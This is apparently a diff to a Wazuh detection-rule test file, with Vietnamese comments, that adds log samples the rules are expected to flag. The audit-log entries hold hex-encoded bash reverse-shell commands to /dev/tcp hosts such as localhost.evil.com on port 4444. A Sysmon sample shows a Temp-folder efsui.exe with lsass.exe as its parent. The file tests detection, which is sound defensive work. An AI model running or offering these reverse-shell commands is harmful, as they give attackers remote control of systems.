@@ -505,3 +505,27 @@
   location: /var/log/auth.log
   events:
   - 'Oct 31 10:00:00 host sshd[1234]: Accepted password for admin from 196.251.67.42 port 4444 ssh2'
+
+- rule: 102511   # 102511 vẫn báo: localhost.evil.com (ngoại lệ localhost phải kết thúc bằng /)
+  log_format: audit
+  location: /var/log/audit/audit.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.207:207): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4207 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="bash" exe="/usr/bin/bash" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.207:207): argc=3 a0="bash" a1="-c" a2=62617368202D69203E26202F6465762F7463702F6C6F63616C686F73742E6576696C2E636F6D2F3434343420303E2631 type=CWD msg=audit(1767225600.207:207): cwd="/root"'
+
+- rule: 102511   # 102511 vẫn báo: 127.0.0.1x (không phải 127.0.0.1)
+  log_format: audit
+  location: /var/log/audit/audit.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.208:208): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4208 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="bash" exe="/usr/bin/bash" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.208:208): argc=3 a0="bash" a1="-c" a2=62617368202D69203E26202F6465762F7463702F3132372E302E302E31782F3434343420303E2631 type=CWD msg=audit(1767225600.208:208): cwd="/root"'
+
+- rule: 102511   # 102511 vẫn báo: biến chỉ ở host, port là số ($H/4444)
+  log_format: audit
+  location: /var/log/audit/audit.log
+  events:
+  - 'type=SYSCALL msg=audit(1767225600.209:209): arch=c000003e syscall=59 success=yes exit=0 a0=55 a1=56 a2=57 a3=0 items=2 ppid=3999 pid=4209 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm="bash" exe="/usr/bin/bash" key="audit-wazuh-c" type=EXECVE msg=audit(1767225600.209:209): argc=3 a0="bash" a1="-c" a2=62617368202D69203E26202F6465762F7463702F24482F3434343420303E2631 type=CWD msg=audit(1767225600.209:209): cwd="/root"'
+
+- rule: 61627   # 61627 vẫn báo: efsui.exe NGOÀI System32 do lsass.exe mở (ngoại lệ gắn với System32)
+  log_format: eventchannel
+  location: EventChannel
+  events:
+  - '{"Message": "Process Create:\r\nRuleName: -\r\nUtcTime: 2026-02-01 00:00:01.000\r\nProcessGuid: {00000000-0000-0000-0000-000000000000}\r\nProcessId: 4037\r\nImage: C:\\Users\\lan\\AppData\\Local\\Temp\\efsui.exe\r\nFileVersion: -\r\nDescription: -\r\nProduct: -\r\nCompany: -\r\nOriginalFileName: efsui.exe\r\nCommandLine: efsui.exe\r\nCurrentDirectory: C:\\\r\nUser: COMPANY\\lan\r\nLogonGuid: {00000000-0000-0000-0000-000000000000}\r\nLogonId: 0x3e7\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: -\r\nParentProcessGuid: {00000000-0000-0000-0000-000000000000}\r\nParentProcessId: 3999\r\nParentImage: C:\\Windows\\System32\\lsass.exe\r\nParentCommandLine: C:\\Windows\\System32\\lsass.exe\r\nParentUser: COMPANY\\lan", "Event": "<Event xmlns=''http://schemas.microsoft.com/win/2004/08/events/event''><System><Provider Name=''Microsoft-Windows-Sysmon'' Guid=''{5770385f-c22a-43e0-bf4c-06f5698ffbd9}''/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime=''2026-02-01T00:00:01.000000Z''/><EventRecordID>37</EventRecordID><Correlation/><Execution ProcessID=''3000'' ThreadID=''4000''/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>bench-win</Computer><Security UserID=''S-1-5-18''/></System><EventData><Data Name=''RuleName''>-</Data><Data Name=''UtcTime''>2026-02-01 00:00:01.000</Data><Data Name=''ProcessGuid''>{00000000-0000-0000-0000-000000000000}</Data><Data Name=''ProcessId''>4037</Data><Data Name=''Image''>C:\\Users\\lan\\AppData\\Local\\Temp\\efsui.exe</Data><Data Name=''FileVersion''>-</Data><Data Name=''Description''>-</Data><Data Name=''Product''>-</Data><Data Name=''Company''>-</Data><Data Name=''OriginalFileName''>efsui.exe</Data><Data Name=''CommandLine''>efsui.exe</Data><Data Name=''CurrentDirectory''>C:\\</Data><Data Name=''User''>COMPANY\\lan</Data><Data Name=''LogonGuid''>{00000000-0000-0000-0000-000000000000}</Data><Data Name=''LogonId''>0x3e7</Data><Data Name=''TerminalSessionId''>1</Data><Data Name=''IntegrityLevel''>High</Data><Data Name=''Hashes''>-</Data><Data Name=''ParentProcessGuid''>{00000000-0000-0000-0000-000000000000}</Data><Data Name=''ParentProcessId''>3999</Data><Data Name=''ParentImage''>C:\\Windows\\System32\\lsass.exe</Data><Data Name=''ParentCommandLine''>C:\\Windows\\System32\\lsass.exe</Data><Data Name=''ParentUser''>COMPANY\\lan</Data></EventData></Event>"}'
